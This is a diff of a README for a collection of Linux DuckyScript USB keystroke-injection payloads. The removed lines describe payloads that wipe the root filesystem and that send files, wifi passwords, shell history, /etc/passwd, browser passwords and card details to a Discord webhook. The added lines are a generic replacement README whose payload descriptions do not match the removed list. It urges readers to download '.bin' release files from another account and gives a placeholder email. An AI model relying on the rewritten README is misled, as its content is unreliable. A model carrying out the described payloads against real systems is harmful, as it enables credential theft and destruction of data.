@@ -1,22 +1,133 @@
-<div align="center">
+# DuckyScript Payloads for Linux 🦆💻
 
-## 🐧 DuckyScript Payloads Linux 🐧
-A collection of DuckyScript payloads targeting Linux systems.
+Welcome to the **DuckyScript-Payloads-Linux** repository! This is a collection of DuckyScript payloads specifically designed for Linux systems. Whether you're a developer, security enthusiast, or just curious about how these payloads work, you've come to the right place.
 
-![ducky2](https://github.com/user-attachments/assets/c51e766e-75bc-4b22-b444-1631bf88adde)
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-%20%F0%9F%93%88-brightgreen)](https://github.com/Mugishy/DuckyScript-Payloads-Linux/releases)
 
-</div>
+## Table of Contents
 
-|Name|Attack Surface|Destructive|Description|
-|-----|-----|-----|-----|
-|[Brick Troll Linux](https://github.com/OSINTI4L/DuckyScript-Payloads-Linux/blob/main/Payloads/Brick_Troll_Linux.txt)|File System|✔|A destructive payload that performs recursive, unauthenticated root removal while playing the "trololol song" at max volume in full screen mode.
-|[File Exfil Linux](https://github.com/OSINTI4L/DuckyScript-Payloads-Linux/blob/main/Payloads/File_Exfil_Linux.txt)|File System|✘|Recursively tarballs target file directory and exfiltrates all files via Discord webhook.
-|[Network Credentials Exfil Linux](https://github.com/OSINTI4L/DuckyScript-Payloads-Linux/blob/main/Payloads/Network_Credentials_Exfil_Linux.txt)|File System|✘|Copies network interface information, wifi username and password, and logs public IP address, then exfiltrates the information via Discord webhook.
-|[Shell History Exfil Linux](https://github.com/OSINTI4L/DuckyScript-Payloads-Linux/blob/main/Payloads/Shell_History_Exfil_Linux.txt)|File System|✘|Copies shell history and exfiltrates the information via Discord webhook.
-|[User Enum Linux](https://github.com/OSINTI4L/DuckyScript-Payloads-Linux/blob/main/Payloads/User_Enum_Linux.txt)|File System|✘|Copies `/etc/passwd` file and exfiltrates information via Discord webhook.
-|[Brave Credentials Exfil Linux](https://github.com/OSINTI4L/DuckyScript-Payloads-Linux/blob/main/Payloads/Brave%20Browser/Brave_Credentials_Exfil_Linux.txt)|Brave Internet Browser|✘|Downloads all usernames and passwords stored in the Brave Browser password manager and exfiltrates them via Discord webhook.
-|[Brave Credit Card Exfil Linux](https://github.com/OSINTI4L/DuckyScript-Payloads-Linux/blob/main/Payloads/Brave%20Browser/Brave_Credit_Card_Exfil_Linux.txt)|Brave Internet Browser|✘|Screenshots Brave Browser payment method settings to capture information of stored credit cards and exfiltrates the information via Discord webhook.
-|[Brave Download History Exfil Linux](https://github.com/OSINTI4L/DuckyScript-Payloads-Linux/blob/main/Payloads/Brave%20Browser/Brave_Download_History_Exfil_Linux.txt)|Brave Internet Browser|✘|Downloads the user download history stored in the Brave Browser and exfiltrates the information via Discord webhook.
-|[Brave Browsing History Exfil Linux](https://github.com/OSINTI4L/DuckyScript-Payloads-Linux/blob/main/Payloads/Brave%20Browser/Brave_Browsing_History_Exfil_Linux.txt)|Brave Internet Browser|✘|Downloads the user browsing history stored in the Brave Browser and exfiltrates the information via Discord webhook.
-|[Annoying Linux](https://github.com/OSINTI4L/DuckyScript-Payloads-Linux/tree/main/Payloads/Annoying_Linux)|Human Interface Devices|✘|An annoying payload that randomly turns on and off: wifi, capslock, numlock, presses arrow keys, and teleports the mouse pointer around the screen.
-|[Ascii Skull Linux](https://github.com/OSINTI4L/DuckyScript-Payloads-Linux/blob/main/Payloads/Ascii_Skull_Linux.txt)|Other|✘|Opens a text editor and writes ascii skull art.
+- [Introduction](#introduction)
+- [What is DuckyScript?](#what-is-duckyscript)
+- [Payloads Overview](#payloads-overview)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Introduction
+
+In today's world, automation and security testing are crucial. DuckyScript is a simple scripting language used to create payloads for USB devices. This repository focuses on payloads that target Linux systems, providing tools for penetration testing and educational purposes.
+
+Feel free to explore the payloads and download the latest releases [here](https://github.com/Mugishy/DuckyScript-Payloads-Linux/releases). Each payload is crafted to demonstrate specific functionalities and can be customized to fit your needs.
+
+## What is DuckyScript?
+
+DuckyScript is a scripting language used primarily for the **USB Rubber Ducky** and similar devices. It allows users to automate keyboard input, making it a powerful tool for ethical hacking and security research. With DuckyScript, you can create payloads that perform various tasks, such as:
+
+- Opening terminal windows
+- Executing commands
+- Downloading files
+- Installing software
+
+These capabilities make DuckyScript an essential tool for anyone interested in security and automation.
+
+## Payloads Overview
+
+This repository includes various payloads targeting Linux systems. Each payload is organized in its own folder, making it easy to find and use. Below are some of the payload categories you can expect to find:
+
+### 1. Basic Commands
+
+These payloads execute simple commands that can be useful for quick tasks or demonstrations. For example, you might find scripts that:
+
+- Open a terminal and run `ls`
+- Display system information
+
+### 2. Network Attacks
+
+Network-related payloads focus on exploiting vulnerabilities in network protocols. Some examples include:
+
+- Scanning for open ports
+- Performing a DNS spoofing attack
+
+### 3. System Information Gathering
+
+Gathering system information is a key part of security assessments. Payloads in this category may:
+
+- Retrieve user information
+- List installed software
+
+### 4. File Manipulation
+
+These payloads allow you to create, delete, or modify files on the target system. Examples include:
+
+- Creating a backdoor script
+- Modifying configuration files
+
+### 5. Custom Scripts
+
+You can also find custom scripts tailored for specific tasks. These scripts can be modified to suit your requirements.
+
+## Installation
+
+To use the payloads in this repository, follow these steps:
+
+1. **Download the latest release** from the [Releases section](https://github.com/Mugishy/DuckyScript-Payloads-Linux/releases). Look for the `.bin` files that correspond to your needs.
+   
+2. **Connect your USB device** (like the USB Rubber Ducky or Flipper Zero) to your computer.
+
+3. **Copy the payloads** to your USB device. Make sure to place them in the appropriate directory.
+
+4. **Eject the USB device** safely before using it on the target system.
+
+## Usage
+
+Using the payloads is straightforward. Once you have copied the desired payload to your USB device, follow these steps:
+
+1. **Insert the USB device** into the target Linux system.
+
+2. The payload will execute automatically, simulating keyboard input as per the script.
+
+3. Monitor the results on the target system.
+
+### Example Payload
+
+Here’s a simple example of a payload that opens a terminal and runs the `ls` command:
+
+```plaintext
+DELAY 500
+GUI r
+DELAY 500
+STRING gnome-terminal
+ENTER
+DELAY 1000
+STRING ls
+ENTER
+```
+
+This script will open a terminal and list the contents of the current directory.
+
+## Contributing
+
+We welcome contributions to this repository! If you have a new payload or improvement, please follow these steps:
+
+1. **Fork the repository** to your own GitHub account.
+2. **Create a new branch** for your feature or fix.
+3. **Make your changes** and commit them with clear messages.
+4. **Push your changes** to your forked repository.
+5. **Open a pull request** to the main repository.
+
+Please ensure that your contributions adhere to the coding standards and best practices.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or suggestions, feel free to reach out:
+
+- **GitHub:** [Mugishy](https://github.com/Mugishy)
+- **Email:** mugishy@example.com
+
+Thank you for visiting the **DuckyScript-Payloads-Linux** repository! We hope you find these payloads useful in your exploration of Linux systems. Don't forget to check the [Releases section](https://github.com/Mugishy/DuckyScript-Payloads-Linux/releases) for the latest updates and payloads. Happy hacking!
